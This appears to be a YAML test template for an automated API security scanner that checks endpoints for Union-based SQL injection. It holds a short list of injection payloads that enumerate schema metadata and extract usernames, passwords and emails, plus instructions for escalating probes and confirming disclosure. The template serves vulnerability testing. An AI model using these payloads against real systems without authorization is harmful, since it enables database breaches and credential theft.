id: SMART_ADVANCED_UNION_BASED_SQLI
info:
  name: "Advanced Union based SQL Injection test - Smart Testing"
  description: "Test advanced Union-based SQL injection aimed at schema and data extraction (information_schema, database(), version(), user tables). Keep baseline method, URL, and auth intact; mutate only injectable string parameters in body or query."
  details: "Clone the baseline. Across 4-5+ probes escalate from column-count UNION SELECT nulls to payloads that request database metadata or user table columns. Vary target fields and comment terminators. Proof vs baseline: THIS response discloses data absent from baseline (table/column names, version strings, usernames/passwords/emails) OR returns SQL/DB errors that prove the injected UNION executed. Generic success with unchanged body, or payload keywords merely reflected, is NOT vulnerable. Escalate to stronger extraction payloads and alternate fields after a miss."
  impact: "Retrieval of credentials, financial data, or application secrets from the database; unauthorized access and compliance risk."
  category:
    name: NO_AUTH
    shortName: Broken Authentication
    displayName: Broken User Authentication (BUA)
  subCategory: SMART_ADVANCED_UNION_BASED_SQLI
  severity: MEDIUM
  agenticTestingAllowed: true
  onlySmartTestingAllowed: true
  tags:
    - SQL Injection
    - OWASP top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
  cwe:
    - CWE-89
  cve:
    - CVE-2020-24008

attributes:
  nature: INTRUSIVE
  plan: PRO
  duration: FAST

api_selection_filters:
  response_code:
    gte: 200
    lt: 300
  method:
    neq: "OPTIONS"
  or:
    - request_payload:
        for_one:
          key:
            regex: .*
            extract: userKey
          value:
            extract: userVal
    - query_param:
        for_one:
          key:
            regex: .*
            extract: userKey
          value:
            extract: userVal

wordLists:
  unionSQLiPayloads:
    - "' UNION SELECT null, null--"
    - "' UNION SELECT 1, database(), version()--"
    - "' UNION SELECT table_name, column_name, 3 FROM information_schema.columns--"
    - "' UNION SELECT username, password, email FROM users--"

execute:
  type: single
  requests:
    - req:
        - modify_body_param:
            userKey: ${userVal}${unionSQLiPayloads}
        - modify_query_param:
            userKey: ${userVal}${unionSQLiPayloads}
